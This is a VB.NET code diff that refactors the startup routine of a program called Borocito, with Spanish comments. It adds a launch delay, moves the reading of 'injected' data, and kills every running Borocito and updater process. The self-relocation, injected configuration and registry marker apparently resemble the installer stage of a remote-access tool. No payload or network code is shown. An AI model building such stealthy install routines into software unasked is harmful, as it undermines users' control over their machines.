@@ -71,13 +71,12 @@ Module Memory
 End Module
 Module StartUp
     Sub Init()
+        Threading.Thread.Sleep(5000)
         Try
             'Inicia desde otra ubicacion
             RunFromLocation()
             'Crear las carpetas necesarias en raiz
             CreateRootFolders()
-            'Lee los datos del inyectado
-            LoadInject()
             'Ver si ya existe una instancia anterior
             CheckIfExist()
             'Extraer
@@ -112,7 +111,7 @@ Module StartUp
     End Sub
     Sub CreateRootFolders()
         Try
-            If My.Computer.FileSystem.DirectoryExists(DIRCommons) = False Then
+            If Not My.Computer.FileSystem.DirectoryExists(DIRCommons) Then
                 My.Computer.FileSystem.CreateDirectory(DIRCommons)
             End If
         Catch ex As Exception
@@ -142,6 +141,7 @@ Module StartUp
     End Sub
     Sub SetExistence()
         Try
+            LoadInject() 'Lee los datos del inyectado
             Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
             Registry.CurrentUser.CreateSubKey("SOFTWARE\\Borocito")
             regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
@@ -154,26 +154,26 @@ Module StartUp
         Try
             AddToLog("StartExtract@StartUp", "Inicializando Extractor...", False)
             Try
-                Dim Borocito As Process() = Process.GetProcessesByName("Borocito")
-                If Borocito.Length >= 1 Then
-                    Borocito(0).Kill()
-                End If
+                Dim Borocito = Process.GetProcessesByName("Borocito")
+                For i As Integer = 0 To Borocito.Count - 1
+                    Borocito(i).Kill()
+                Next i
             Catch ex As Exception
                 AddToLog("StartExtract(KillProc(0))@StartUp", "Error: " & ex.Message, True)
             End Try
             Try
-                Dim Updater As Process() = Process.GetProcessesByName("BorocitoUpdater")
-                If Updater.Length >= 1 Then
-                    Updater(0).Kill()
-                End If
+                Dim Updater = Process.GetProcessesByName("BorocitoUpdater")
+                For i As Integer = 0 To Updater.Count - 1
+                    Updater(i).Kill()
+                Next i
             Catch ex As Exception
                 AddToLog("StartExtract)KillProc(1))@StartUp", "Error: " & ex.Message, True)
             End Try
             Try
-                Dim Updater2 As Process() = Process.GetProcessesByName("BoroUpdater")
-                If Updater2.Length >= 1 Then
-                    Updater2(0).Kill()
-                End If
+                Dim Updater = Process.GetProcessesByName("BoroUpdater")
+                For i As Integer = 0 To Updater.Count - 1
+                    Updater(i).Kill()
+                Next i
             Catch ex As Exception
                 AddToLog("StartExtract(KillProc(2))@StartUp", "Error: " & ex.Message, True)
             End Try
